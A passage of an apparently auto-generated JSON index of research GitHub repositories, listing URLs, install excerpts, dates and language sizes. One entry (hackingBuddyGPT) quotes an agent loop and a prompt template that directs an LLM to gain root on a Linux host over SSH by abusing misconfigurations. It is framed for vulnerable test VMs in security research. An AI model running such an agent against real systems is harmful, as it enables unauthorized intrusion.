                "technique": "GitHub_API"
            }
        ]
    },
    "533": {
        "filename": "ojrlopez27_copernic_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ojrlopez27/copernic",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[//]: # (this is a comment: see this link for badges using travis-CI, codecov, etc: https://github.com/mlindauer/SMAC3/blob/warmstarting_multi_model/README.md) \n![build](https://img.shields.io/badge/build-passing-green.svg?cacheSeconds=2592000) \n![test](https://img.shields.io/badge/test-passing-green.svg?cacheSeconds=2592000) \n![coverage](https://img.shields.io/badge/coverage-90%25-yellowgreen.svg?cacheSeconds=2592000) \n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/82ae4c2ab01e40509051a9f115571e92)](https://www.codacy.com/app/ojrlopez27/copernic?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=ojrlopez27/copernic&amp;utm_campaign=Badge_Grade) \n",
                    "original_header": "COPERNIC"
                },
                "confidence": 0.999998498662852,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ojrlopez27/copernic/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-06-21T20:08:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-08-18T06:07:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1181249
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7282
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 206
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 29
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "534": {
        "filename": "d-o-m-i-n-i-k_re-identification-risk_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/d-o-m-i-n-i-k/re-identification-risk",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Clone this repo to your local machine using https://github.com/d-o-m-i-n-i-k/re-identification-risk.git",
                    "type": "Text_excerpt",
                    "original_header": "Clone",
                    "parent_header": [
                        "Quantifying the Re-identification Risk of Event Logs for Process Mining",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/d-o-m-i-n-i-k/re-identification-risk/master/README.md"
            },
            {
                "result": {
                    "value": "Summarize all event data that occurs for the corresponding case. After conversion, each row in this data set belongs to one case. \n- Specify the path of the event log (csv) (default is set to subfolder 'datasets' of the current working-directory)\n- Specify the name of the source-file\n- Specify the unique identifier like CaseID, serial number etc.\n- Specify a list of attributes to consider or a list of attributes to exclude\n- The resulting list will be exported by default to a folder named after the dataset. \nThe folder is a subfolder of 'results' in the working directory.\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Preparation of the data",
                    "parent_header": [
                        "Quantifying the Re-identification Risk of Event Logs for Process Mining",
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/d-o-m-i-n-i-k/re-identification-risk/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-28T07:38:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-06-15T15:24:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15032
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "535": {
        "filename": "similarityMetrics_similarityMetrics_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/similarityMetrics/similarityMetrics",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "(Their code was downloaded from: https://github.com/mcmillco/funcom)\n \n",
                    "original_header": "Step 2: Train Attendgru"
                },
                "confidence": 0.9974932917791103,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/similarityMetrics/similarityMetrics/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-14T17:19:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-27T14:18:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 38319
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "536": {
        "filename": "harvey-lau_fgo_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/harvey-lau/fgo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "FGo is a fuzzing tool based on [AFLGo](https://github.com/aflgo/aflgo). You can follow the instructions below to build it step by step. \nFirstly, enter the [`Dependency`](./Dependency/) directory and build the dependencies. You can run the `download-libraries.sh`, `build-llvm11.sh`, `build-svf.sh` and `build-jsoncpp.sh` one by one to download the LLVM pre-built binaries (or source code) and Z3 pre-built binaries. \nSecondly, enter the [`Analyzer`](./Analyzer/) directory and build the distance analyzer via `build-analyzer.sh`. \nFinally, enter the [`AFL-Fuzz`](./AFL-Fuzz/) directory and use `make` to build FGo.\n \n",
                    "original_header": "The ReadMe of fgo"
                },
                "confidence": 0.997580092300255,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/harvey-lau/fgo/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-26T08:43:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-03T16:41:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 450596
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 174380
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 51463
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 20754
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 6584
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "537": {
        "filename": "susperius_icisc_rnnfuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/susperius/icisc_rnnfuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Numpy\n* Tensorflow\n* tqdm\n```bash\npip install numpy tensorflow tqdm\n```\n \n",
                    "original_header": "Required Packages"
                },
                "confidence": 0.9999999983160421,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/susperius/icisc_rnnfuzz/master/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-10-29T11:08:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-24T02:03:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 37328596
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 22196
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "538": {
        "filename": "alinebrito_composite-refactoring-catalog_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/alinebrito/composite-refactoring-catalog",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-19T01:23:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-09T01:54:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 33847896
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 28214
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "539": {
        "filename": "UPHF_migA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UPCArtifacts/migA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "First, execute `mvn clean -Dmaven.test.skip=true`\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "migA"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/UPHF/migA/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "A Tool for analyzing migrations from Java to Kotlin on Git repositories. \n",
                    "original_header": "migA"
                },
                "confidence": 0.9764375198222345,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/UPHF/migA/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-03-31T12:34:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-01-20T09:33:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 302983
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "540": {
        "filename": "yaxirhuxxain_DeepVS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yaxirhuxxain/DeepVS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "@IF EXIST \"%~dp0\\node.exe\" (\n  \"%~dp0\\node.exe\"  \"%~dp0\\..\\vscode\\bin\\install\" %*\n) ELSE (\n  @SETLOCAL\n  @SET PATHEXT=%PATHEXT:;.JS;=;%\n  node  \"%~dp0\\..\\vscode\\bin\\install\" %*\n)",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/yaxirhuxxain/DeepVS/master/SourceCode/node_modules/.bin/vscode-install.cmd"
            },
            {
                "result": {
                    "value": "Download the plugin provided in this repository and follow the guide illustrated below\n![DeepVS Setup Demo](Demo/setup.gif)\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "DeepVS: A deep learning-based source code suggestion tool.",
                        "DeepVS Demo"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yaxirhuxxain/DeepVS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-12-18T02:22:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-07-15T04:50:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2669
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 2547
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 809
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "541": {
        "filename": "Spirals-Team_npefix_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SpoonLabs/npefix",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Maven-repair is a Maven plugin for bug-fixing, see <https://github.com/Spirals-Team/repairnator/tree/master/maven-repair>\n \n",
                    "original_header": "Using maven-repair"
                },
                "confidence": 0.9996839922292059,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/npefix/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Install:\n```\ngit clone https://github.com/Spirals-Team/npefix/\ncd npefix\nmvn install\n``` \n",
                    "original_header": "Command line"
                },
                "confidence": 0.9999999999803464,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/npefix/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To reproduce the evaluation from the [paper]():\n1. Gets the NPE Dataset: https://github.com/Spirals-Team/npe-dataset\n2. Installs each bug on your system, in order to download the dependencies\n3. Configures the location of the dataset in src/main/resources/config.ini\n4. Creates the jar with all dependencies: `mvn clean compile assembly:single`\n5. Execute `java -jar target/npefix-0.3-jar-with-dependencies.jar` (see the execution usage below)\n \n",
                    "original_header": "Reproduce the Scientific Evaluation"
                },
                "confidence": 0.9999997452326039,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/npefix/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-09-09T15:18:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-05T10:18:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 570337
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "542": {
        "filename": "jingkai92_learning-program-representation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jingkai92/learning-program-representation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-17T00:05:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-24T01:44:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 368806
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "543": {
        "filename": "ipa-lab_hackingBuddyGPT_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ipa-lab/hackingBuddyGPT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We try to keep our python dependencies as light as possible. This should allow for easier experimentation. To run the main priv-escalation program (which is called `wintermute`) together with an OpenAI-based model you need:\n\n1. an OpenAI API account, you can find the needed keys [in your account page](https://platform.openai.com/account/api-keys)\n    - please note that executing this script will call OpenAI and thus charges will occur to your account. Please keep track of those.\n2. a potential target that is accessible over SSH. You can either use a deliberately vulnerable machine such as [Lin.Security.1](https://www.vulnhub.com/entry/) or a security benchmark such as our [linux priv-esc benchmark](https://github.com/ipa-lab/benchmark-privesc-linux).\n\nTo get everything up and running, clone the repo, download requirements, setup API keys and credentials, and start `wintermute.py`:\n\n```bash\n# clone the repository\n$ git clone https://github.com/ipa-lab/hackingBuddyGPT.git\n$ cd hackingBuddyGPT\n\n# setup virtual python environment\n$ python -m venv venv\n$ source ./venv/bin/activate\n\n# install python requirements\n$ pip install -e .\n\n# copy default .env.example\n$ cp .env.example .env\n\n# IMPORTANT: setup your OpenAI API key, the VM's IP and credentials within .env\n$ vi .env\n\n# if you start wintermute without parameters, it will list all available use cases\n$ python src/hackingBuddyGPT/cli/wintermute.py\nusage: wintermute.py [-h]\n                     {LinuxPrivesc,WindowsPrivesc,ExPrivEscLinux,ExPrivEscLinuxTemplated,ExPrivEscLinuxHintFile,ExPrivEscLinuxLSE,MinimalWebTesting,WebTestingWithExplanation,SimpleWebAPITesting,SimpleWebAPIDocumentation}\n                     ...\nwintermute.py: error: the following arguments are required: {LinuxPrivesc,WindowsPrivesc,ExPrivEscLinux,ExPrivEscLinuxTemplated,ExPrivEscLinuxHintFile,ExPrivEscLinuxLSE,MinimalWebTesting,WebTestingWithExplanation,SimpleWebAPITesting,SimpleWebAPIDocumentation}\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup and Usage",
                    "parent_header": [
                        "<div class=\"vertical-align: middle\"><img src=\"https://github.com/ipa-lab/hackingBuddyGPT/blob/main/docs/hackingbuddy-rounded.png?raw=true\" width=\"72\"> HackingBuddyGPT <a href=\"https://discord.gg/vr4PhSM8yN\"><img alt=\"Discord\" src=\"https://dcbadge.vercel.app/api/server/vr4PhSM8yN?style=flat&amp;compact=true\" /></a></div>",
                        "Build your own Agent/Usecase"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ipa-lab/hackingBuddyGPT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to use hackingBuddyGPT and need help selecting the best LLM for your tasks, [we have a paper comparing multiple LLMs](https://arxiv.org/abs/2310.11409).\n \n",
                    "original_header": "<div class=\"vertical-align: middle\"><img src=\"https://github.com/ipa-lab/hackingBuddyGPT/blob/main/docs/hackingbuddy-rounded.png?raw=true\" width=\"72\"> HackingBuddyGPT <a href=\"https://discord.gg/vr4PhSM8yN\"><img alt=\"Discord\" src=\"https://dcbadge.vercel.app/api/server/vr4PhSM8yN?style=flat&amp;compact=true\" /></a></div>"
                },
                "confidence": 0.9951133250284984,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ipa-lab/hackingBuddyGPT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "~~~ python\ntemplate_dir = pathlib.Path(__file__).parent\ntemplate_next_cmd = Template(filename=str(template_dir / \"next_cmd.txt\")) \n    conn: SSHConnection = None\n    _sliding_history: SlidingCliHistory = None \n    def init(self):\n        super().init()\n        self._sliding_history = SlidingCliHistory(self.llm)\n        self.add_capability(SSHRunCommand(conn=self.conn), default=True)\n        self.add_capability(SSHTestCredential(conn=self.conn))\n        self._template_size = self.llm.count_tokens(template_next_cmd.source) \n            # get the next command from the LLM\n            answer = self.llm.get_response(template_next_cmd, capabilities=self.get_capability_block(), history=history, conn=self.conn)\n            cmd = llm_util.cmd_output_fixer(answer.result) \n        with self._log.console.status(\"[bold green]Executing that command...\"):\n            self._log.console.print(Panel(answer.result, title=\"[bold cyan]Got command from LLM:\"))\n            result, got_root = self.get_capability(cmd.split(\" \", 1)[0])(cmd) \nThe corresponding `next_cmd.txt` template would be:\n``` mako\nYou are a low-privilege user ${conn.username} with password ${conn.password} on a linux system and your goal is to become the user 'root' by abusing commands and misconfiguration on the tested system.\n\n${capabilities}\n\n% if len(history) != 0:\nYou already tried the following commands:\n\n~~~ bash\n${history}\n~~~\n\nDo not repeat already tried escalation attacks.\n%endif\n\nGive your command. Do not add any explanation or add an initial `$`.\n```\n \n",
                    "original_header": "Build your own Agent/Usecase"
                },
                "confidence": 0.9780695638168012,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ipa-lab/hackingBuddyGPT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We are using vulnerable Linux systems running in Virtual Machines for this. Never run this against real systems. \n",
                    "original_header": "Provide a Target Machine over SSH"
                },
                "confidence": 0.9644074874888059,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ipa-lab/hackingBuddyGPT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-02T08:30:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T22:54:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 235722
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "544": {
        "filename": "SOLAR-group_GIDroid_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SOLAR-group/GIDroid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\nFirst clone the project and open a terminal in the directory that it is cloned too.\n\nBuild using gradle (alternatively import into your favourite IDE, such as IntelliJ). We also provide a gradle wrapper with Gradle 4.10.2.\n\n```\n./gradlew assemble\n```\n\nThis will build and test GIDroid, and also create a fat jar at `build/gin.jar` containing all required dependencies.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing and Building gin",
                    "parent_header": [
                        "GIDroid: A Tool for Multi-Objective GI in Android",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SOLAR-group/GIDroid/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-28T15:14:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-02T18:17:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 42878480
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 2991424
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1675858
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 1195578
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 195606
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 186953
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 143452
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 92153
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 69094
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 41580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "AIDL",
                    "name": "AIDL",
                    "type": "Programming_language",
                    "size": 23172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 13156
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 12828
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "545": {
        "filename": "tsigalko18_webembed-replication-package_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tsigalko18/webembed-replication-package",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-03-30T10:59:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-27T08:28:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 114500
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 6072
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "546": {
        "filename": "zhongxingyu_Solidity-Event-Study_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zhongxingyu/Solidity-Event-Study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-23T00:18:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-24T17:29:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 3035687
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 453563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 28139
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 24857
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "547": {
        "filename": "GPTutor_gptutor-extension_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/GPTutor/gptutor-extension",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "  <img width=\"274\" alt=\"\u622a\u5716 2023-06-11 \u4e0b\u53484 00 56\" src=\"https://github.com/GPTutor/gptutor-extension/assets/84802160/94fe1248-5308-42a8-b836-2f1694a9c5c9\">\n<br/>\n<br/>\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Install the GPTutor(\ud83e\udd16,\ud83e\udd16) in your Visual Studio Code editor from Extensions",
                    "parent_header": [
                        "GPTutor(\ud83e\udd16,\ud83e\udd16) - VS Code Extension",
